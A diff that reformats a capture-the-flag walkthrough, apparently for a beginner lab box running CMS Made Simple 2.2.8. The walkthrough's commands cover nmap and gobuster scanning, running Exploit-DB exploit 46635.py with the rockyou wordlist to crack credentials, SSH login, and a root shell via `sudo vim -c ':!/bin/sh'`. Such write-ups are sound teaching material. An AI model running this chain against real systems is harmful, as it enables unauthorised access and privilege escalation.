@@ -4,7 +4,9 @@ Beginner level ctf
 
 ## Set up environment IP as target IP_MACHINE
 
-`export IP=10.10.179.1`  
+```
+export IP=10.10.179.1
+```  
 
 ![IP](./images/IP.png)
 
@@ -17,7 +19,9 @@ Beginner level ctf
 
 * Scan open port with nmap
 
-	`nmap -sV -sC $IP | tee nmap-scan.txt`  
+	```
+	nmap -sV -sC $IP | tee nmap-scan.txt
+	```  
 
 	File scan resulted [here](./files/nmap-scan.txt)  
 
@@ -27,7 +31,9 @@ Beginner level ctf
 	
 	* Default directory scan
 		
-		`gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster-default.txt`  
+		```
+		gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster-default.txt
+		```  
 
 		File scan resulted [here](./files/gobuster-default.txt)  
 
@@ -35,7 +41,9 @@ Beginner level ctf
 
 	* Sub directory scan
 		
-		`gobuster dir -u $IP/simple -w /usr/share/wordlists/dirb/common.txt | tee gobuster-simple.txt`  
+		```
+		gobuster dir -u $IP/simple -w /usr/share/wordlists/dirb/common.txt | tee gobuster-simple.txt
+		```  
 		
 		File scan resulted [here](./files/gobuster-simple.txt)  
 
@@ -60,19 +68,25 @@ Beginner level ctf
 
 	* Search exploit 
 		
-		`searchsploit CMS made simple 2.2.8`  
+		```
+		searchsploit CMS made simple 2.2.8
+		```  
 
 		![exploit-search](./images/exploit-search.png)
 
 	* Download exploit file
 		
-		`searchsploit -m php/webapps/46635.py`  
+		```
+		searchsploit -m php/webapps/46635.py
+		```  
 
 		![exploit-download](./images/exploit-download.png)
 
 	* Check CVE number 
 		
-		`nano 46635.py`  
+		```
+		nano 46635.py
+		```  
 
 		![cve-number](./images/cve-number.png)
 
@@ -81,7 +95,9 @@ Beginner level ctf
 
 * Run the exploit file with python2
 
-	`python2 46635.py -u http://$IP/simple --crack -w /usr/share/wordlists/rockyou.txt`  
+	```
+	python2 46635.py -u http://$IP/simple --crack -w /usr/share/wordlists/rockyou.txt
+	```  
 
 	![script-run](./images/script-run.png)
 	
@@ -91,7 +107,9 @@ Beginner level ctf
 
 * Login to target machine
 
-	`ssh -p 2222 mitch@$IP`  
+	```
+	ssh -p 2222 mitch@$IP
+	```
 
 	![ssh-login](./images/ssh-login.png)
 
@@ -103,13 +121,17 @@ Beginner level ctf
 
 	* Check privilege escalation with sudo
 	
-		`sudo -l`  
+		```
+		sudo -l
+		```  
 
 		![sudo-l](./images/sudo-l.png)
 
 	* Run sudo to get root access
 	
-		`sudo vim -c ':!/bin/sh'`  
+		```
+		sudo vim -c ':!/bin/sh'
+		```  
 
 		![home-user](./images/home-user.png)
 
